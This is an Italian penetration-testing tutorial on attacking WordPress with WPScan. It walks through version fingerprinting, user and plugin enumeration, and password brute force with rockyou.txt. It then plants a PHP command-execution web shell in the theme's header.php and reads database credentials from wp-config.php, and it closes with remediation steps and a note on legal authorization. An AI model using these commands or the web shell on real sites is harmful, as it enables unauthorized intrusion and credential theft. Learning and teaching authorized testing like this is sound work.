# CMS Exploitation: WordPress & WPScan

> - **Fase:** Web Attack - CMS Exploitation (WordPress)
> - **Visibilita:** Media - WPScan genera traffico HTTP strutturato, rilevabile da WAF e IDS
> - **Prerequisiti:** WordPress identificato dalla fase di tech profiling, pagina `/wp-login.php` accessibile, API token WPScan (opzionale per dati plugin aggiuntivi)
> - **Output:** Versione WordPress, lista plugin con CVE, lista utenti, eventuale accesso admin tramite brute force

---

## Introduzione

WordPress e il CMS piu diffuso al mondo con oltre il 43% del mercato web. La sua popolarita lo rende il target piu frequente nei web application penetration test. La sua architettura a plugin introduce una superficie di attacco frammentata: il core di WordPress e generalmente sicuro nelle versioni recenti, ma le vulnerabilita si trovano quasi sempre nei plugin di terze parti.

Il ciclo di attacco su WordPress segue quattro fasi distinte, ciascuna con strumenti specifici:

1. **Fingerprinting:** confermare la versione di WordPress e identificare il tema attivo.
2. **Enumerazione:** plugin installati (e le loro versioni), utenti, file di configurazione esposti.
3. **Verifica CVE:** incrociare le versioni trovate con il database delle vulnerabilita note di WPScan.
4. **Exploitation:** brute force sulle credenziali admin, o exploit diretto di un plugin vulnerabile.

WPScan e lo strumento de facto per questo lavoro: un black-box scanner open-source scritto in Ruby, specificamente progettato per WordPress, con un database di vulnerabilita aggiornato quotidianamente (wpscan.com/wordpress-security-database).

---

## Fase 1: Fingerprinting

La conferma della versione e il prerequisito per il CVE mapping. WordPress espone la versione in piu punti:

```Bash
# Identificazione versione tramite WhatWeb
whatweb -v http://<TARGET>

# Verifica diretta dei file che espongono la versione
curl -s http://<TARGET>/readme.html | grep -i "version"
curl -s http://<TARGET>/wp-includes/version.php
```

Output di esempio (readme.html):

```
WordPress 6.2.2
...
WordPress is web software you can use to create a beautiful website, blog, or app.
```

Il file `readme.html` e spesso lasciato accessibile per default e rivela la versione esatta. In un engagement reale, la sua rimozione e una delle prime remediation da raccomandare.

---

## Fase 2: Enumerazione con WPScan

### Installazione

```Bash
# Su Kali Linux (preinstallato)
wpscan --version

# Aggiornamento database vulnerabilita
wpscan --update
```

### Enumerazione completa

```Bash
# Scansione base con enumerazione di plugin vulnerabili, temi e utenti
wpscan --url http://<TARGET> --enumerate vp,vt,u

# Opzioni:
#   vp  = vulnerable plugins (plugin con CVE note)
#   vt  = vulnerable themes (temi con CVE note)
#   u   = users (enumerazione utenti)
#   ap  = all plugins (tutti i plugin, anche senza CVE)
#   at  = all themes
```

Output di esempio (enumerazione plugin):

```
[+] Enumerating Vulnerable Plugins

[i] Plugin(s) Identified:

[+] contact-form-7
 | Location: http://target.com/wp-content/plugins/contact-form-7/
 | Last Updated: 2023-11-20T09:00:00.000Z
 | [!] The version is out of date, the latest version is 5.8.4
 | Version: 5.7.4 (100% confidence)                               <-- versione obsoleta
 |
 | Found By: Readme File Disclosure (Aggressive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Contact Form 7 <= 5.8.3 - Reflected Cross-Site Scripting   <-- CVE
 |     Fixed in: 5.8.4
 |     References:
 |      - https://wpscan.com/vulnerability/xxxxx
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-XXXXX
```

### Enumerazione utenti

```Bash
wpscan --url http://<TARGET> --enumerate u
```

Output di esempio:

```
[+] Enumerating Users

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Login Error Messages (Aggressive Detection)
 |  WP JSON API (Aggressive Detection) -> http://target.com/?author=1

[+] editor_john
 | Found By: Author Posts - Author Pattern (Passive Detection)       <-- username esposto
```

Il fatto che WordPress esponga gli username tramite l'API REST (`/?author=1`) e una misconfiguration strutturale che facilita il brute force sulle credenziali.

---

## Fase 3: Brute Force delle Credenziali

```Bash
# Brute force con lista di password (rockyou.txt o lista custom)
wpscan --url http://<TARGET> --usernames admin,editor_john --passwords /usr/share/wordlists/rockyou.txt

# Con throttling per evitare lockout
wpscan --url http://<TARGET> --usernames admin -P passlist.txt --throttle 3000
# --throttle 3000 -> attendi 3 secondi tra ogni tentativo
```

Output di esempio (credenziale trovata):

```
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / password123                             <-- CREDENZIALE VALIDA

[!] Valid Combinations Found:
 | Username: admin, Password: password123
```

---

## Fase 4: Post-Authentication Exploitation

Ottenuto l'accesso admin, le azioni post-exploitation piu comuni:

**Deploy Web Shell via Theme Editor:**

```Bash
# 1. Accedere a: Appearance -> Theme Editor -> header.php (o functions.php)
# 2. Iniettare codice PHP per eseguire comandi di sistema:
<?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?>
# 3. Chiamare la Web Shell:
#    http://<TARGET>/wp-content/themes/<TEMA>/header.php?cmd=id
```

**Accesso al database tramite phpMyAdmin (se esposto):**

```Bash
# Controllare se phpMyAdmin e accessibile
curl -s http://<TARGET>/phpmyadmin/
curl -s http://<TARGET>/pma/
```

**Dump credenziali dal file `wp-config.php`:**

```Bash
# Se si ha RCE, leggere le credenziali del database
cat /var/www/html/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST"
```

---

## Remediation

- **Azione immediata:** rimuovere `readme.html` e tutti i file che espongono la versione (`/wp-includes/version.php` deve essere inaccessibile via web).
- **Aggiornamenti:** mantenere aggiornati WordPress core, tutti i plugin e i temi. Abilitare gli aggiornamenti automatici per le patch di sicurezza.
- **Username:** disabilitare l'enumerazione utenti tramite l'API REST: aggiungere una regola in `.htaccess` o usare un plugin di sicurezza (Wordfence, Sucuri) per bloccare `/?author=N`.
- **Login:** proteggere `/wp-login.php` con CAPTCHA, 2FA (Google Authenticator) e IP allowlisting per gli accessi admin. Considerare di spostare il login su un URL custom (plugin `WPS Hide Login`).
- **Principio del minimo privilegio:** rimuovere i plugin e i temi non utilizzati. Meno plugin = meno superficie di attacco.
- **Verifica:** rieseguire `wpscan --enumerate vp` dopo ogni aggiornamento per confermare che non ci siano piu plugin con CVE note.

---

## Tool di riferimento

| Tool | Tipo | Tecnica/Accesso | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `wpscan` | WordPress scanner | CLI - Attiva | Enumerazione completa e brute force su WordPress |
| `nuclei` | Template-based | CLI - Attiva | Template `/technologies/cms/wordpress/` per CVE specifiche |
| `metasploit` | Exploitation framework | CLI/GUI - Attiva | Exploit automatizzati per plugin WordPress vulnerabili |
| `burpsuite` | Web proxy | GUI - Manuale | Analisi manuale di funzionalita WordPress (IDOR, CSRF) |
| `xmlrpc-scan` | XML-RPC tester | CLI - Attiva | Test abuso dell'endpoint `xmlrpc.php` per brute force |

> **Nota API Token WPScan:** senza API token, WPScan non mostra le CVE specifiche per i plugin. Registrarsi gratuitamente su `wpscan.com` e aggiungere `--api-token <TOKEN>` al comando per abilitare il vulnerability database completo.

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Reconnaissance | Active Scanning: Vulnerability Scanning | `T1595.002` | Scansione con WPScan per identificare plugin vulnerabili, versione WordPress e CVE associate |
| Reconnaissance | Gather Victim Host Info: Software | `T1592.002` | Fingerprinting della versione WordPress tramite `readme.html` e header HTTP |
| Discovery | Account Discovery | `T1087` | Enumerazione degli username WordPress tramite l'API REST (`/?author=1`) con WPScan `--enumerate u` |
| Credential Access | Brute Force: Password Guessing | `T1110.001` | Attacco dizionario su `/wp-login.php` con lista credenziali tramite WPScan |
| Persistence | Server Software Component: Web Shell | `T1505.003` | Deploy di codice PHP nel Theme Editor di WordPress dopo accesso admin per mantenere la persistenza |
| Execution | Command and Scripting Interpreter: PHP | `T1059.006` | Esecuzione di comandi di sistema tramite Web Shell PHP iniettata in `header.php` del tema |

---

> **Nota:** Le tecniche documentate in questa guida sono state praticate su istanze WordPress
> installate in ambienti di laboratorio locali e su piattaforme di pratica autorizzate (es.
> HackTheBox, TryHackMe, DVWP - Damn Vulnerable WordPress). L'utilizzo di WPScan su siti
> WordPress reali senza autorizzazione scritta del proprietario e vietato e costituisce un reato
> ai sensi dell'art. 615-ter c.p. e del Computer Fraud and Abuse Act (CFAA) per target USA.
